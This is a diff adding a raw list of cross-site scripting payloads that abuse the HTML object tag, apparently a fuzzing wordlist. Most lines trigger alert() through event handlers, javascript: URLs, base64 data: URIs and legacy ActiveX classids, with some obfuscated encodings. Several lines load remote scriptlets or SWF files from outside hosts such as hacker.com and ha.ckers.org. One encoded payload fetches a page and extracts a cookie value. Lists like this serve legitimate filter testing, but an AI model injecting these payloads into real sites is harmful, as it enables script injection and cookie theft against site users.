@@ -1,0 +1,86 @@
+<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
+<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-14961496D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1496)"></OBJECT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-582582D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(582)"></OBJECT>
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(1894)>;<;/OBJECT>;
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-16061606d1606-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1606)></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-692692d692-8b76-0080c744f389><param name=url value=javascript:javascript:alert(692)></OBJECT>
+<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+<object data="data:text/html;base64,%(base64)s">
+<object data='data:text/html;base64,PFNDUklQVD5hbGVydCgnUkVOV0FYMjMnKTs8L1NDUklQVD4=' /src>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<object data="javascript:alert(1)">
+<object data=javascript:alert(1)> 
+<object data=javascript:alert(212)>
+<object data="javascript:alert(XSS)">
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object data=/ onload=alert(1)>
+<object data=/ onreadystatechange=alert(1)>
+<object draggable="true" ondrag="alert(1)">test</object>
+<object draggable="true" ondragend="alert(1)">test</object>
+<object draggable="true" ondragenter="alert(1)">test</object>
+<object draggable="true" ondragleave="alert(1)">test</object>
+<object draggable="true" ondragstart="alert(1)">test</object>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object id="x" classid="clsid:CB927D15532-4FF7-4a9e-A155369-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C15537-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1553)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object id="x" classid="clsid:CB927D6392-4FF7-4a9e-A63969-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C6397-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(639)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<object id=x onfocus=alert(1) type=text/html>
+<object id=x onfocusin=alert(1) type=text/html>
+<object id=x tabindex=1 onactivate=alert(1)></object>
+<object id=x tabindex=1 onbeforeactivate=alert(1)></object>
+<object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>
+<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>
+<object onbeforecopy="alert(1)" contenteditable>test</object>
+<object onbeforecut="alert(1)" contenteditable>test</object>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1242)"></object onbeforeload>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(343)"></object onbeforeload>
+<object onbeforepaste="alert(1)" contenteditable>test</object>
+<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onclick="alert(1)">test</object>
+<object oncontextmenu="alert(1)">test</object>
+<object oncopy="alert(1)" contenteditable>test</object>
+<object oncut="alert(1)" contenteditable>test</object>
+<object ondblclick="alert(1)">test</object>
+<object onerror=alert(1) data=1 type=image/gif>
+<object onerror=javascript:javascript:alert(1)>
+<object onerror=javascript:javascript:alert(1619)>
+<object onerror=javascript:javascript:alert(705)>
+<object onError object onError="javascript:javascript:alert(1230)"></object onError>
+<object onError object onError="javascript:javascript:alert(1)"></object onError>
+<object onError object onError="javascript:javascript:alert(331)"></object onError>
+<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
+<object onkeydown="alert(1)" contenteditable>test</object>
+<object onkeypress="alert(1)" contenteditable>test</object>
+<object onkeyup="alert(1)" contenteditable>test</object>
+<object onmousedown="alert(1)">test</object>
+<object onmouseenter="alert(1)">test</object>
+<object onmouseleave="alert(1)">test</object>
+<object onmousemove="alert(1)">test</object>
+<object onmouseout="alert(1)">test</object>
+<object onmouseover="alert(1)">test</object>
+<object onmouseup="alert(1)">test</object>
+<object onpaste="alert(1)" contenteditable>test</object>
+<object src=1191 href=1191 onerror="javascript:alert(1191)"></object>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<object src=292 href=292 onerror="javascript:alert(292)"></object>
+OBJECT Tag
+<object type=text/html data='javascript.:alert(15);'></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
